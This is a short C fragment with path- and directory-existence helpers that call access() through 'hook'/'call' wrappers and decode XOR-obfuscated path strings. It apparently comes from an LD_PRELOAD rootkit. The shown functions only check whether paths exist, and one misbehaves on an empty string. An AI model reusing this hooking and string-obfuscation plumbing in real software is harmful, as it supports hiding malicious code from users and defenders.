int direxists(const char *pathname){
    const size_t pathsize = strlen(pathname), tmpsize = pathsize+2;
    char tmp[tmpsize];
    memset(tmp, 0, tmpsize);
    strcpy(tmp, pathname);
    if(tmp[pathsize-1] != '/')
        strcat(tmp, "/");
    hook(CACCESS);
    return (long)call(CACCESS, tmp, F_OK) == 0;
}

int xdirexists(const char *pathname){
    char *_ = xordup(pathname);
    if(!_) return 0;
    int rv = direxists(_);
    clean(_);
    return rv;
}

int pathexists(const char *pathname){
    hook(CACCESS);
    return (long)call(CACCESS, pathname, F_OK) == 0 || direxists(pathname);
}